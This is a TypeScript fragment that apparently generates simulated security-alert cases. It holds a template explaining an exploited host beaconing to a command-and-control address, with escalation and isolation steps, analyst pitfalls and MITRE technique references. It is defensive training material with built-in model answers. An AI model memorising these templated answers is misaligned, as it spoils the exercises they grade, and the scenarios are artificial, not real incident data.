          : `The second question is what the host did next. After the hit ${target.name} opened a regular series of outbound sessions to ${c2}, an address it had never used, every ~${Math.round(period / SEC)}s. ${klass === 'edge' ? edgeNoun : internalNoun} does not do that on its own: exploitation succeeded and the host is calling its new owner. This alert's evidence is in the network logs, so that is where the follow-on shows: the firewall records the sessions, not their content, so web-protocol command and control is inferred from their regular rhythm over 443.`,
        `The host carries ${vulnId}, the weakness this signature targets. That is why a scan finding that stays open matters: the finding and this alert point at the same weakness. Escalate, isolate ${target.name}, block ${c2}${klass === 'edge' ? ` and ${attacker}` : ''}${scanner ? ', and leave the scanner and the other scanned servers alone' : ''}.${klass === 'edge' ? '' : ` The source is an unmanaged address inside the network, most likely an attacker already inside (or a rogue device): treat it as one, find that source device and contain it too, because isolating ${target.name} alone leaves the way in open.`}`,
      ],
      pitfalls: [
        scanner ? 'Searching for the vulnerability id returns the scanner\'s hits and the real one together. "The scanner explains it" is true for some hits, not for all of them.' : 'A signature hit is not proof of compromise by itself. What matters is whether the host did anything afterwards.',
        'Blocking the source address is not containment: the host already called out to a new address, so it has to be isolated and examined.',
        ...(klass === 'edge' ? [] : ['An internal source is not a safe source. An address that no managed device owns, inside the network, is an attacker already past the perimeter; stopping at the server leaves that device free.']),
      ],
      references: [technique(klass === 'edge' ? 'T1190' : 'T1210'), technique('T1071.001')],
    };
  },
};

export const LINKED_TEMPLATES: CaseTemplate[] = [endpointKnownVulnExploit];
